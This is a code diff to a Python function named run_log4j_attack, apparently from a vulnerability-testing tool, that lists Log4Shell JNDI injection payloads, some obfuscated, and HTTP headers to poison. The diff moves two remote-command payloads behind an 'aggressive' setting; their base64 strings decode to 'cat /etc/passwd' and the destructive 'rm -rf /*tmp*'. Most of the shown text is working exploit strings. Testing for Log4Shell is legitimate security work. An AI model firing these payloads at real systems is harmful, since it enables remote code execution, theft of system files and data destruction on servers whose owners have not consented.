@@ -17,12 +17,14 @@ def run_log4j_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, 
         "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1:1389/a}", # Obfuscated
         "${jndi:dns://127.0.0.1/a}",
         "${jndi:rmi://127.0.0.1/a}",
-        
-        # DESTRUCTIVE / AGGRESSIVE PAYLOADS (User Requested)
-        # Attempt to trigger remote command execution via LDAP reference
-        "${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/Y2F0IC9ldGMvcGFzc3dk}", # cat /etc/passwd
-        "${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/cm0gLXJmIC8qdG1wKg==}", # rm -rf /*tmp* (Destructive)
     ]
+    
+    if scenario.config.get("aggressive"):
+        print("    [!!!] LOG4SHELL AGGRESSIVE: Adding RCE payloads")
+        payloads.extend([
+            "${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/Y2F0IC9ldGMvcGFzc3dk}", # cat /etc/passwd
+            "${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/cm0gLXJmIC8qdG1wKg==}", # rm -rf /*tmp* (Destructive)
+        ])
     
     headers_to_poison = ["User-Agent", "X-Api-Version", "Referer", "Authentication"]
     issues = []
